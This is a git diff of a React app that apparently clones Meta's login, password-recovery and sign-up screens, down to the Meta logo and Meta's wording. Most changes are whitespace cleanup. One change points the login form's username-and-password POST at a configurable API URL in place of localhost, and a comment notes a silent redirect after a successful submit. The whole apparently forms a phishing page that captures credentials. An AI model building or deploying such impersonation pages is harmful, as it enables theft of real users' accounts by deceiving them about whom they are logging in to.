@@ -46,14 +46,14 @@ function Login({ onNavigate }) {
       alert('Please enter username and password');
       return;
     }
-    
+
     try {
-      const response = await fetch('http://localhost:5000/api/login', {
+      const response = await fetch(import.meta.env.VITE_API_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ username, password })
       });
-      
+
       const data = await response.json();
       if (response.ok) {
         // Redirect directly without any message
@@ -108,8 +108,8 @@ function Login({ onNavigate }) {
 
         <div className="form-container">
           <div className="input-wrapper">
-            <input 
-              type="text" 
+            <input
+              type="text"
               className={`input-field ${username ? 'has-value' : ''}`}
               value={username}
               onChange={(e) => setUsername(e.target.value)}
@@ -117,8 +117,8 @@ function Login({ onNavigate }) {
             <span className="floating-label">Username, email address or mobile number</span>
           </div>
           <div className="input-wrapper">
-            <input 
-              type="password" 
+            <input
+              type="password"
               className={`input-field ${password ? 'has-value' : ''}`}
               value={password}
               onChange={(e) => setPassword(e.target.value)}
@@ -134,9 +134,9 @@ function Login({ onNavigate }) {
       <div className="footer">
         <button className="create-account-btn" onClick={() => onNavigate('create')}>Create new account</button>
         <div className="meta-logo-container" style={{ display: 'flex', justifyContent: 'center', width: '100%' }}>
-          <img 
-            src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" 
-            alt="Meta" 
+          <img
+            src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg"
+            alt="Meta"
             style={{ height: '16px', objectFit: 'contain' }}
           />
         </div>
@@ -158,9 +158,9 @@ function Login({ onNavigate }) {
             <h2 className="modal-title">Select your language</h2>
             <div className="lang-list-container">
               {LANGUAGES.map((lang, idx) => (
-                <div 
-                  key={idx} 
-                  className="lang-item" 
+                <div
+                  key={idx}
+                  className="lang-item"
                   onClick={() => {
                     setSelectedLang(lang);
                     setIsLangOpen(false);
@@ -207,8 +207,8 @@ function ForgotPassword({ onNavigate }) {
 
         <div className="form-container">
           <div className="input-wrapper">
-            <input 
-              type={mode === 'mobile' ? 'tel' : 'text'} 
+            <input
+              type={mode === 'mobile' ? 'tel' : 'text'}
               className={`input-field ${inputValue ? 'has-value' : ''}`}
               value={inputValue}
               onChange={(e) => setInputValue(e.target.value)}
@@ -252,16 +252,16 @@ function CreateAccount({ onNavigate }) {
         <h1 className="forgot-title">
           {mode === 'mobile' ? "What's your mobile number?" : "What's your email address?"}
         </h1>
-        <p className="forgot-subtitle" style={{marginBottom: '20px'}}>
-          {mode === 'mobile' 
-            ? "Enter the mobile number on which you can be contacted. No one will see this on your profile." 
+        <p className="forgot-subtitle" style={{ marginBottom: '20px' }}>
+          {mode === 'mobile'
+            ? "Enter the mobile number on which you can be contacted. No one will see this on your profile."
             : "Enter the email address on which you can be contacted. No one will see this on your profile."}
         </p>
 
         <div className="form-container">
           <div className="input-wrapper">
-            <input 
-              type={mode === 'mobile' ? 'tel' : 'email'} 
+            <input
+              type={mode === 'mobile' ? 'tel' : 'email'}
               className={`input-field ${inputValue ? 'has-value' : ''}`}
               value={inputValue}
               onChange={(e) => setInputValue(e.target.value)}
